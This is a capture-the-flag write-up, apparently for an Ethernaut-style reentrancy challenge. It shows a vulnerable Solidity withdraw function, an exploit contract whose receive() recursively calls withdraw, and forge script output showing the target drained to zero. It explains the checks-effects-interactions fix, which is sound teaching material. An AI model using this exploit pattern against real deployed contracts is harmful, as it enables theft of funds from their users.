
### Challenge 10 Reentrancy
- vulnerability: Classic reentrancy
- [full contract](src/10_Reentrancy.sol)
```Solidity
    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
			// ## Re-enterancy:
			// Lets withdraw some funds to our account.. BUT!
			// What if.. in our receive() function, we call withdraw() again...
			// We are going to make this contract send us money.. 
			// repeatedly, effectively draining all the funds.
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```
- This is a bad practice in general. We should finish all of our 'effects' and local variable states update before making any external calls.

[Exploit Contract](script/10_ReentrancySolve.s.sol):
```Solidity
    // The receive function on our exploit contract
	receive() external payable {
		// Important: we don't want a failed tx because it will revert
		if (address(msg.sender).balance >= MINIMUM_BALANCE) {
			// keep withdrawing
			IReentrance(msg.sender).withdraw(MINIMUM_BALANCE);
		} else {
			IReentrance(msg.sender).withdraw(msg.sender.balance);
		}
	}
```
- `MINIMUM_BALANCE` is set to 0.001 ether which is the total balance of the traget contract (exploit done with just 1 recursion). smaller units can be choosen, but it will consumes more gas, as more recursion calls.

```
❯ forge script script/10_ReentrancySolve.s.sol --tc Exploit --rpc-url $RPC_URL --private-key $PK --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Script ran successfully.

== Logs ==
  Target balance:  1000000000000000
  Executing Exploit...
  Success
  Target balance:  0
```

